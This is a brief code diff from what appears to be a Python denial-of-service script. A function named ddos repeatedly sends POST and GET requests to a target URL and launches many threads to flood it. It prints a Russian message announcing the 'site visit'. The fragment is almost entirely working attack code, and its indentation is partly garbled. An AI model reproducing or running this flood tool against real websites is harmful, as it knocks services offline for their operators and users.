@@ -10,9 +10,8 @@ def ddos():
 while(1<10):
   spam = requests.post(url)
   spam2 = requests.get(url)
-  for i in range(int(thrnom)):
-   
-while True:
+ for i in range(int(thrnom)):
+ while True:
   thr = Thread(target=ddos)
   thr.start()
  print("[+] Заход на сайт выполнен!")
